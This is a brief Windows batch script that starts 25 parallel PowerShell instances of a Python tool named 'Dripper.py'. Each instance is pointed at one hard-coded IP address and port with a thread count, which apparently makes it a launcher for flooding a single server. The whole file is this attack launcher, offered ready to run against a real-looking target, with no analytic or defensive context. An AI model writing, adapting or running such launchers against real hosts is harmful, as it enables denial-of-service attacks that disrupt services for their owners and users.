@echo off
for /L %%i in (1,1,25) do (
    start powershell -Command "python Dripper.py -s 159.205.215.95 -p 90 -t 443 -q"
)